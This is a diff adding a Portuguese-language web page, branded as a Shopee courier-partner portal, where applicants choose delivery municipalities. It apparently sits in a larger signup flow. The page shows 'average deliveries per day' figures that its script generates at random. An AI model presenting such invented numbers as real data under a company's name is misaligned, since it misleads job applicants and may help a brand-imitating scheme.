@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Municípios - Shopee Entregas</title>
+  <style>
+    :root {
+      --primary-color: #ee4d2d;
+      --primary-dark: #d03a1b;
+      --secondary-color: #0066cc;
+      --text-color: #333;
+      --light-bg: #f8f9fa;
+      --border-radius: 8px;
+      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text-color);
+      background-color: var(--light-bg);
+    }
+    
+    header {
+      background-color: var(--primary-color);
+      padding: 1.5rem 1rem;
+      color: white;
+      text-align: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    header h1 {
+      margin: 0;
+      font-size: 1.8rem;
+    }
+    
+    header p {
+      margin: 0.25rem 0 0;
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    main {
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+    
+    .breadcrumb {
+      display: flex;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+    
+    .breadcrumb a {
+      color: var(--secondary-color);
+      text-decoration: none;
+    }
+    
+    .breadcrumb span {
+      margin: 0 0.5rem;
+      color: #999;
+    }
+    
+    .container {
+      background-color: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      box-shadow: var(--card-shadow);
+    }
+    
+    .page-header {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    
+    .page-header h2 {
+      color: var(--primary-color);
+      margin-bottom: 0.5rem;
+    }
+    
+    .page-header p {
+      color: #666;
+    }
+    
+    .search-box {
+      margin-bottom: 2rem;
+      position: relative;
+    }
+    
+    .search-input {
+      width: 100%;
+      padding: 0.8rem 3rem 0.8rem 1rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    
+    .search-input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
+    }
+    
+    .search-icon {
+      position: absolute;
+      right: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #999;
+    }
+    
+    .municipalities-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+    }
+    
+    .municipality-card {
+      border: 1px solid #ddd;
+      border-radius: var(--border-radius);
+      padding: 1rem;
+      transition: var(--transition);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+    
+    .municipality-card:hover {
+      border-color: var(--primary-color);
+      background-color: #fff9f8;
+    }
+    
+    .municipality-card.selected {
+      border-color: var(--primary-color);
+      background-color: rgba(238, 77, 45, 0.05);
+    }
+    
+    .municipality-checkbox {
+      flex-shrink: 0;
+      width: 24px;
+      height: 24px;
+      border: 2px solid #ddd;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: var(--transition);
+    }
+    
+    .municipality-card.selected .municipality-checkbox {
+      border-color: var(--primary-color);
+      background-color: var(--primary-color);
+      color: white;
+    }
+    
+    .municipality-info {
+      flex-grow: 1;
+    }
+    
+    .municipality-info h3 {
+      margin-bottom: 0.3rem;
+      font-size: 1.1rem;
+    }
+    
+    .municipality-info p {
+      font-size: 0.9rem;
+      color: #666;
+    }
+    
+    .selected-counter {
+      background-color: var(--light-bg);
+      padding: 1rem;
+      border-radius: var(--border-radius);
+      margin-bottom: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .counter-text {
+      font-weight: bold;
+    }
+    
+    .counter-text span {
+      color: var(--primary-color);
+    }
+    
+    .pagination {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-bottom: 2rem;
+    }
+    
+    .pagination button {
+      padding: 0.5rem 1rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      background-color: white;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    
+    .pagination button:hover {
+      border-color: var(--primary-color);
+      color: var(--primary-color);
+    }
+    
+    .pagination button.active {
+      background-color: var(--primary-color);
+      color: white;
+      border-color: var(--primary-color);
+    }
+    
+    .pagination button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    
+    .form-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 2rem;
+    }
+    
+    .btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      font-size: 1rem;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+    }
+    
+    .btn-secondary {
+      background-color: #f1f1f1;
+      border: none;
+      color: #333;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e1e1e1;
+    }
+    
+    footer {
+      background-color: #333;
+      color: white;
+      padding: 2rem 1rem;
+      text-align: center;
+      margin-top: 3rem;
+    }
+    
+    footer p {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links a {
+      color: #ddd;
+      margin: 0 0.5rem;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      color: white;
+      text-decoration: underline;
+    }
+    
+    @media (max-width: 768px) {
+      .municipalities-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .form-actions {
+        flex-direction: column;
+        gap: 1rem;
+      }
+      
+      .btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Shopee Entregas</h1>
+    <p>Portal do Entregador Parceiro</p>
+  </header>
+  
+  <main>
+    <div class="breadcrumb">
+      <a href="/">Home</a>
+      <span>/</span>
+      <a href="/cadastro">Cadastro</a>
+      <span>/</span>
+      <strong>Municípios</strong>
+    </div>
+    
+    <div class="container">
+      <div class="page-header">
+        <h2>Escolha os Municípios para Entrega</h2>
+        <p>Selecione os municípios onde você deseja realizar entregas</p>
+      </div>
+      
+      <div class="search-box">
+        <input type="text" class="search-input" id="search-input" placeholder="Buscar município...">
+        <svg xmlns="http://www.w3.org/2000/svg" class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"></circle>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+        </svg>
+      </div>
+      
+      <div class="selected-counter">
+        <div class="counter-text">Municípios selecionados: <span id="selected-count">0</span></div>
+        <button class="btn btn-secondary" id="btn-clear">Limpar seleção</button>
+      </div>
+      
+      <div class="municipalities-grid" id="municipalities-container">
+        <!-- Os municípios serão inseridos aqui via JavaScript -->
+        <div class="municipality-card">
+          <div class="municipality-checkbox"></div>
+          <div class="municipality-info">
+            <h3>Carregando...</h3>
+            <p>Buscando municípios disponíveis</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="pagination" id="pagination-container">
+        <!-- Paginação será inserida aqui via JavaScript -->
+      </div>
+      
+      <div class="form-actions">
+        <button type="button" class="btn btn-secondary" id="btn-voltar">Voltar</button>
+        <button type="button" class="btn btn-primary" id="btn-continuar">Continuar</button>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
+    <div class="footer-links">
+      <a href="#">Termos de Uso</a>
+      <a href="#">Política de Privacidade</a>
+      <a href="#">Contato</a>
+    </div>
+  </footer>
+
+  <script>
+    // Elementos do DOM
+    const searchInput = document.getElementById('search-input');
+    const selectedCountElement = document.getElementById('selected-count');
+    const btnClear = document.getElementById('btn-clear');
+    const municipalitiesContainer = document.getElementById('municipalities-container');
+    const paginationContainer = document.getElementById('pagination-container');
+    const btnVoltar = document.getElementById('btn-voltar');
+    const btnContinuar = document.getElementById('btn-continuar');
+    
+    // Estado da aplicação
+    let municipalities = [];
+    let filteredMunicipalities = [];
+    let selectedMunicipalities = [];
+    let currentPage = 1;
+    const itemsPerPage = 12;
+    
+    // Carregar municípios do estado do usuário
+    function loadMunicipalities() {
+      // Verificar se temos dados do usuário
+      const userData = localStorage.getItem('userData');
+      if (!userData) {
+        alert('Por favor, complete seu cadastro antes de selecionar municípios.');
+        window.location.href = '/cadastro';
+        return;
+      }
+      
+      // Obter estado do usuário
+      const data = JSON.parse(userData);
+      const state = data.estado;
+      
+      if (!state) {
+        alert('Estado não encontrado. Por favor, complete seu cadastro.');
+        window.location.href = '/cadastro';
+        return;
+      }
+      
+      // Obter municípios por estado
+      fetch(`/api/municipalities/${state}`)
+        .then(response => response.json())
+        .then(data => {
+          // Transformar para o formato necessário
+          municipalities = data.map(name => ({
+            nome: name,
+            selecionado: false,
+            entregas: Math.floor(Math.random() * 10) + 1 // Número aleatório de 1 a 10
+          }));
+          
+          // Ordenar por nome
+          municipalities.sort((a, b) => a.nome.localeCompare(b.nome));
+          
+          // Carregar seleções anteriores se existirem
+          const savedSelections = localStorage.getItem('selectedMunicipalities');
+          if (savedSelections) {
+            const selections = JSON.parse(savedSelections);
+            municipalities = municipalities.map(mun => ({
+              ...mun,
+              selecionado: selections.includes(mun.nome)
+            }));
+            selectedMunicipalities = municipalities.filter(m => m.selecionado).map(m => m.nome);
+            updateSelectedCount();
+          }
+          
+          filteredMunicipalities = [...municipalities];
+          renderMunicipalities();
+        })
+        .catch(error => {
+          console.error('Erro ao carregar municípios:', error);
+          // Usar dados fake em caso de erro
+          useFakeData(state);
+        });
+    }
+    
+    // Usar dados fake em caso de erro na API
+    function useFakeData(state) {
+      const fakeMunicipalities = {
+        'SP': ['São Paulo', 'Campinas', 'Guarulhos', 'Santos', 'Ribeirão Preto', 'São José dos Campos', 'Sorocaba', 'Santo André', 'Osasco', 'São Bernardo do Campo', 'Barueri', 'Jundiaí', 'Piracicaba', 'São Caetano do Sul', 'Mogi das Cruzes'],
+        'RJ': ['Rio de Janeiro', 'Niterói', 'São Gonçalo', 'Duque de Caxias', 'Nova Iguaçu', 'Petrópolis', 'Volta Redonda', 'Belford Roxo', 'Campos dos Goytacazes', 'São João de Meriti'],
+        'MG': ['Belo Horizonte', 'Uberlândia', 'Contagem', 'Juiz de Fora', 'Betim', 'Montes Claros', 'Ribeirão das Neves', 'Uberaba', 'Governador Valadares', 'Ipatinga'],
+        'BA': ['Salvador', 'Feira de Santana', 'Vitória da Conquista', 'Camaçari', 'Itabuna', 'Juazeiro', 'Lauro de Freitas', 'Ilhéus', 'Jequié', 'Alagoinhas'],
+        'PR': ['Curitiba', 'Londrina', 'Maringá', 'Ponta Grossa', 'Cascavel', 'São José dos Pinhais', 'Foz do Iguaçu', 'Colombo', 'Guarapuava', 'Paranaguá'],
+        'RS': ['Porto Alegre', 'Caxias do Sul', 'Pelotas', 'Canoas', 'Santa Maria', 'Gravataí', 'Viamão', 'Novo Hamburgo', 'São Leopoldo', 'Rio Grande'],
+        'PE': ['Recife', 'Jaboatão dos Guararapes', 'Olinda', 'Caruaru', 'Petrolina', 'Paulista', 'Cabo de Santo Agostinho', 'Camaragibe', 'Garanhuns', 'Vitória de Santo Antão'],
+        'CE': ['Fortaleza', 'Caucaia', 'Juazeiro do Norte', 'Maracanaú', 'Sobral', 'Crato', 'Itapipoca', 'Maranguape', 'Iguatu', 'Quixadá'],
+        'PA': ['Belém', 'Ananindeua', 'Santarém', 'Marabá', 'Castanhal', 'Parauapebas', 'Abaetetuba', 'Cametá', 'Bragança', 'Capanema'],
+        'SC': ['Florianópolis', 'Joinville', 'Blumenau', 'São José', 'Criciúma', 'Chapecó', 'Itajaí', 'Lages', 'Jaraguá do Sul', 'Palhoça'],
+        'GO': ['Goiânia', 'Aparecida de Goiânia', 'Anápolis', 'Rio Verde', 'Luziânia', 'Águas Lindas de Goiás', 'Valparaíso de Goiás', 'Trindade', 'Formosa', 'Itumbiara'],
+        'MA': ['São Luís', 'Imperatriz', 'Timon', 'Caxias', 'Codó', 'Paço do Lumiar', 'Açailândia', 'Bacabal', 'Balsas', 'Santa Inês'],
+        'PB': ['João Pessoa', 'Campina Grande', 'Santa Rita', 'Patos', 'Bayeux', 'Sousa', 'Cajazeiras', 'Guarabira', 'Cabedelo', 'Sapé'],
+        'ES': ['Vitória', 'Vila Velha', 'Serra', 'Cariacica', 'Cachoeiro de Itapemirim', 'Linhares', 'São Mateus', 'Guarapari', 'Colatina', 'Aracruz'],
+        'RN': ['Natal', 'Mossoró', 'Parnamirim', 'São Gonçalo do Amarante', 'Macaíba', 'Ceará-Mirim', 'Caicó', 'Açu', 'Currais Novos', 'São José de Mipibu'],
+        'AM': ['Manaus', 'Parintins', 'Itacoatiara', 'Manacapuru', 'Coari', 'Tefé', 'Tabatinga', 'Humaitá', 'São Gabriel da Cachoeira', 'Maués'],
+        'AL': ['Maceió', 'Arapiraca', 'Rio Largo', 'Palmeira dos Índios', 'União dos Palmares', 'São Miguel dos Campos', 'Delmiro Gouveia', 'Coruripe', 'Penedo', 'Marechal Deodoro'],
+        'PI': ['Teresina', 'Parnaíba', 'Picos', 'Piripiri', 'Floriano', 'Campo Maior', 'Barras', 'Pedro II', 'União', 'Altos'],
+        'MT': ['Cuiabá', 'Várzea Grande', 'Rondonópolis', 'Sinop', 'Tangará da Serra', 'Cáceres', 'Sorriso', 'Lucas do Rio Verde', 'Primavera do Leste', 'Barra do Garças'],
+        'DF': ['Brasília', 'Ceilândia', 'Taguatinga', 'Planaltina', 'Gama', 'Guará', 'Samambaia', 'Santa Maria', 'Sobradinho', 'Águas Claras'],
+        'MS': ['Campo Grande', 'Dourados', 'Três Lagoas', 'Corumbá', 'Ponta Porã', 'Naviraí', 'Nova Andradina', 'Aquidauana', 'Sidrolândia', 'Maracaju'],
+        'SE': ['Aracaju', 'Nossa Senhora do Socorro', 'Lagarto', 'Itabaiana', 'São Cristóvão', 'Estância', 'Tobias Barreto', 'Simão Dias', 'Itabaianinha', 'Nossa Senhora da Glória'],
+        'RO': ['Porto Velho', 'Ji-Paraná', 'Ariquemes', 'Vilhena', 'Cacoal', 'Rolim de Moura', 'Jaru', 'Guajará-Mirim', 'Pimenta Bueno', 'Ouro Preto do Oeste'],
+        'TO': ['Palmas', 'Araguaína', 'Gurupi', 'Porto Nacional', 'Paraíso do Tocantins', 'Colinas do Tocantins', 'Guaraí', 'Dianópolis', 'Tocantinópolis', 'Miracema do Tocantins'],
+        'AC': ['Rio Branco', 'Cruzeiro do Sul', 'Sena Madureira', 'Tarauacá', 'Feijó', 'Brasileia', 'Epitaciolândia', 'Senador Guiomard', 'Plácido de Castro', 'Mâncio Lima'],
+        'AP': ['Macapá', 'Santana', 'Laranjal do Jari', 'Oiapoque', 'Mazagão', 'Porto Grande', 'Tartarugalzinho', 'Pedra Branca do Amapari', 'Vitória do Jari', 'Calçoene'],
+        'RR': ['Boa Vista', 'Rorainópolis', 'Caracaraí', 'Alto Alegre', 'Mucajaí', 'Cantá', 'Pacaraima', 'Bonfim', 'São João da Baliza', 'Normandia']
+      };
+      
+      // Usar os dados fake do estado selecionado ou SP como padrão
+      const municipalityNames = fakeMunicipalities[state] || fakeMunicipalities['SP'];
+      
+      // Transformar para o formato necessário
+      municipalities = municipalityNames.map(name => ({
+        nome: name,
+        selecionado: false,
+        entregas: Math.floor(Math.random() * 10) + 1 // Número aleatório de 1 a 10
+      }));
+      
+      // Ordenar por nome
+      municipalities.sort((a, b) => a.nome.localeCompare(b.nome));
+      
+      // Carregar seleções anteriores se existirem
+      const savedSelections = localStorage.getItem('selectedMunicipalities');
+      if (savedSelections) {
+        const selections = JSON.parse(savedSelections);
+        municipalities = municipalities.map(mun => ({
+          ...mun,
+          selecionado: selections.includes(mun.nome)
+        }));
+        selectedMunicipalities = municipalities.filter(m => m.selecionado).map(m => m.nome);
+        updateSelectedCount();
+      }
+      
+      filteredMunicipalities = [...municipalities];
+      renderMunicipalities();
+    }
+    
+    // Renderizar municípios na tela
+    function renderMunicipalities() {
+      municipalitiesContainer.innerHTML = '';
+      
+      // Calcular range da página atual
+      const startIndex = (currentPage - 1) * itemsPerPage;
+      const endIndex = startIndex + itemsPerPage;
+      const paginatedItems = filteredMunicipalities.slice(startIndex, endIndex);
+      
+      if (paginatedItems.length === 0) {
+        municipalitiesContainer.innerHTML = '<div class="municipality-card"><div class="municipality-info"><h3>Nenhum município encontrado</h3><p>Tente outro termo de busca</p></div></div>';
+        return;
+      }
+      
+      paginatedItems.forEach((municipality, index) => {
+        const card = document.createElement('div');
+        card.className = `municipality-card${municipality.selecionado ? ' selected' : ''}`;
+        card.dataset.index = startIndex + index;
+        
+        card.innerHTML = `
+          <div class="municipality-checkbox">${municipality.selecionado ? '✓' : ''}</div>
+          <div class="municipality-info">
+            <h3>${municipality.nome}</h3>
+            <p>${municipality.entregas} entregas/dia em média</p>
+          </div>
+        `;
+        
+        card.addEventListener('click', () => toggleMunicipality(startIndex + index));
+        municipalitiesContainer.appendChild(card);
+      });
+      
+      renderPagination();
+    }
+    
+    // Renderizar paginação
+    function renderPagination() {
+      const totalPages = Math.ceil(filteredMunicipalities.length / itemsPerPage);
+      paginationContainer.innerHTML = '';
+      
+      // Botão anterior
+      const prevButton = document.createElement('button');
+      prevButton.textContent = '< Anterior';
+      prevButton.disabled = currentPage === 1;
+      prevButton.addEventListener('click', () => {
+        if (currentPage > 1) {
+          currentPage--;
+          renderMunicipalities();
+        }
+      });
+      paginationContainer.appendChild(prevButton);
+      
+      // Números de página
+      const maxVisiblePages = 5;
+      let startPage = Math.max(1, currentPage - Math.floor(maxVisiblePages / 2));
+      let endPage = Math.min(totalPages, startPage + maxVisiblePages - 1);
+      
+      if (endPage - startPage + 1 < maxVisiblePages) {
+        startPage = Math.max(1, endPage - maxVisiblePages + 1);
+      }
+      
+      for (let i = startPage; i <= endPage; i++) {
+        const pageButton = document.createElement('button');
+        pageButton.textContent = i;
+        pageButton.className = i === currentPage ? 'active' : '';
+        pageButton.addEventListener('click', () => {
+          currentPage = i;
+          renderMunicipalities();
+        });
+        paginationContainer.appendChild(pageButton);
+      }
+      
+      // Botão próximo
+      const nextButton = document.createElement('button');
+      nextButton.textContent = 'Próximo >';
+      nextButton.disabled = currentPage === totalPages;
+      nextButton.addEventListener('click', () => {
+        if (currentPage < totalPages) {
+          currentPage++;
+          renderMunicipalities();
+        }
+      });
+      paginationContainer.appendChild(nextButton);
+    }
+    
+    // Selecionar/deselecionar município
+    function toggleMunicipality(index) {
+      const municipality = filteredMunicipalities[index];
+      municipality.selecionado = !municipality.selecionado;
+      
+      // Atualizar também no array principal
+      const mainIndex = municipalities.findIndex(m => m.nome === municipality.nome);
+      if (mainIndex !== -1) {
+        municipalities[mainIndex].selecionado = municipality.selecionado;
+      }
+      
+      // Atualizar lista de selecionados
+      selectedMunicipalities = municipalities.filter(m => m.selecionado).map(m => m.nome);
+      updateSelectedCount();
+      
+      // Salvar no localStorage
+      localStorage.setItem('selectedMunicipalities', JSON.stringify(selectedMunicipalities));
+      
+      // Re-renderizar
+      renderMunicipalities();
+    }
+    
+    // Atualizar contador de selecionados
+    function updateSelectedCount() {
+      selectedCountElement.textContent = selectedMunicipalities.length;
+    }
+    
+    // Filtrar municípios
+    searchInput.addEventListener('input', (e) => {
+      const searchTerm = e.target.value.toLowerCase().trim();
+      
+      if (searchTerm === '') {
+        filteredMunicipalities = [...municipalities];
+      } else {
+        filteredMunicipalities = municipalities.filter(m => 
+          m.nome.toLowerCase().includes(searchTerm)
+        );
+      }
+      
+      currentPage = 1;
+      renderMunicipalities();
+    });
+    
+    // Limpar seleção
+    btnClear.addEventListener('click', () => {
+      municipalities = municipalities.map(m => ({ ...m, selecionado: false }));
+      filteredMunicipalities = filteredMunicipalities.map(m => ({ ...m, selecionado: false }));
+      selectedMunicipalities = [];
+      updateSelectedCount();
+      localStorage.removeItem('selectedMunicipalities');
+      renderMunicipalities();
+    });
+    
+    // Botão voltar
+    btnVoltar.addEventListener('click', () => {
+      window.location.href = '/cadastro';
+    });
+    
+    // Botão continuar
+    btnContinuar.addEventListener('click', () => {
+      if (selectedMunicipalities.length === 0) {
+        alert('Por favor, selecione pelo menos um município para continuar.');
+        return;
+      }
+      
+      window.location.href = '/recebedor';
+    });
+    
+    // Inicializar página
+    document.addEventListener('DOMContentLoaded', () => {
+      loadMunicipalities();
+    });
+  </script>
+</body>
+</html>
